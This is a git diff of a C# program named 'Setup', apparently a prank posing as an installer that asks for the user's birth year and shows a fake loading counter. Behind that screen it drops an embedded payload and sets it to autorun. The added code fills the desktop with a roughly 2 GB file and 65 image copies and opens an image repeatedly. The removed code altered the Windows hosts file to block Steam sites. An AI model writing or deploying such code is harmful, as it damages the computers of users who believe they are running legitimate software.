@@ -1,9 +1,12 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using static System.Net.Mime.MediaTypeNames;
 
@@ -20,8 +23,6 @@ namespace Setup
                 try
                 {
                     File.WriteAllBytes(pathToPrikol, Resource1.Prikol);
-
-                    HostsSteam();
                     SetToAutorun();
                 }
 
@@ -31,12 +32,39 @@ namespace Setup
                 }
             });
 
+            Console.ForegroundColor = ConsoleColor.Yellow;
+
             Console.Write("Введите ваш год рождения: ");
             Console.ReadLine();
-            Console.WriteLine("Похоже вам: ");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+
+            Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("Загрузка");
-            for(var i = 0; i < 100000; i++) Console.Write($"{i}");
+
+            Thread.Sleep(1000);
+
+            for (var i = 0; i < 10000; i++) Console.Write($"{i}");
+
+            CreateLargeFile();
+            SpanDesktop(Resource1.aaasssddd, 65);
+
+            Thread.Sleep(1000);
+
+            Console.WriteLine();
+
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("Похоже вам: ");
+
+            Thread.Sleep(1000);
+
+            Console.WriteLine();
+
             Console.WriteLine("Аапапахапхахпхапахпхапх, а я че знаю что-ли, апаапазпзапзапзазпазпхапвхаххпахххапахпхапаххаппаапъаъпхаахпахпап");
+
+            Thread.Sleep(1000);
+
+            SaveAndOpenImage(15);
+
             Console.ReadKey();
         }
 
@@ -62,20 +90,35 @@ namespace Setup
             }
         }
 
-        static void HostsSteam()
+        static void SaveAndOpenImage(int repeat)
+        {
+            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd.png";
+            Resource1.asd.Save(path);
+            for (var i = 0; i < repeat;i++) Process.Start(path);
+        }
+
+        static void SpanDesktop(Bitmap image, int count)
+        {
+            var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            for (var i = 0; i < count; i++)
+            {
+                try
+                {
+                    image.Save(path + $"\\asd{i}.png");
+                }
+                catch(Exception e) { Console.WriteLine(e.Message); }
+            }
+        }
+
+        static void CreateLargeFile()
         {
             try
             {
-                var path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
-                var text = "\n127.0.0.1 store.steampowered.com\n127.0.0.1 steamcommunity.com\n127.0.0.1 steamcdn-a.akamaihd.net";
+                var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\asd.png";
 
-                using (var fs = new FileStream(path, FileMode.Append))
-                {
-                    using (var sw = new StreamWriter(fs))
-                    {
-                        sw.WriteLine(text);
-                    }
-                }
+                var bytes = new Byte[1999900000];
+
+                File.WriteAllBytes(path, bytes);
             }
             catch
             {
